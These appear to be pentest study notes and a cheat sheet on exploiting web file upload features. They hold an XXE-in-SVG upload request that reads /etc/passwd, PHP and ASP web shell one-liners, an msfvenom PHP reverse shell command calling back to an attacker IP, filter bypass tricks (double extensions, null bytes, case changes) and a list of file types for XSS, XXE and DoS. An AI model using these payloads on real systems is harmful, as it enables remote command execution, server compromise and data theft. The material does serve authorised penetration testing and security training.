## Note:
> - File upload vuln is only possible if you found the `upload directory` and your `uploaded file`.
> - In most cases, `upload directory` is `hidden`, and your `uploaded file name` would be `changed`. If fuzzing is not possible, then to exploit, you need to chain it with another vuln to read the actual source code index.php or the page that handle to upload in order to find upload directory.
> - When fuzzing for file `ext`, take notice at ext like: `.svg`, `.xml`, `.html`, ... These files can potentially cause `XXE`, `XSS` which can be used to disclosure info and especially explore `upload directory`. And if this is the case, make sure to validate your request, take a `.svg` file for example:
```
<POST REQUEST HEADERS>
...
...
File-name: file.svg
Content-type: image/svg+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg>&xxe;</svg>
-----------------------------PREDEFINE Boundary--
```
> - Make sure to validate the follow: `file name extention`: `.svg`, `Content-Type`: `image/svg+xml`, `Request body`: `your payload`.



## Cheatsheet







````markdown
# File Upload Attacks Cheat Sheet

## Web Shells

### Web Shell Examples

| Payload | Description |
|--------|-------------|
| `<?php file_get_contents('/etc/passwd'); ?>` | Basic PHP file read |
| `<?php system('hostname'); ?>` | Basic PHP command execution |
| `<?php system($_REQUEST['cmd']); ?>` | Basic PHP web shell |
| `<% eval request('cmd') %>` | Basic ASP web shell |

### Reverse Shell Generator

```bash
msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
````

* **PHP Web Shell**: Generic PHP shell
* **PHP Reverse Shell**: Opens a reverse shell connection

### Shell Resources

* [Arrexel/phpbash](https://github.com/Arrexel/phpbash)
* [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)
* [SecLists - Web Shells](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells)

---

## Bypasses

### Blacklist Bypass

| Payload       | Description        |
| ------------- | ------------------ |
| `shell.phtml` | Uncommon extension |
| `shell.pHp`   | Case manipulation  |

* **[PHP Extensions List](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst)**
* **[ASP Extensions List](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Extension%20ASP)**
* **[Web Extensions List](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-extensions.txt)**

### Whitelist Bypass

| Payload                                           | Description                                |
| ------------------------------------------------- | ------------------------------------------ |
| `shell.jpg.php`                                   | Double extension                           |
| `shell.php.jpg`                                   | Reverse double extension                   |
| `%20`, `%0a`, `%00`, `%0d0a`, `/`, `.\`, `.`, `…` | Character injection before/after extension |

---

## Content/Type Bypass

* **[Web Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)**
* **[All Content-Types](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/web-all-content-types.txt)**
* **[File Signatures / Magic Bytes](https://en.wikipedia.org/wiki/List_of_file_signatures)**

---

## Limited Uploads

### Potential Attack File Types

| Attack       | File Types              |
| ------------ | ----------------------- |
| **XSS**      | HTML, JS, SVG, GIF      |
| **XXE/SSRF** | XML, SVG, PDF, PPT, DOC |
| **DoS**      | ZIP, JPG, PNG           |

---

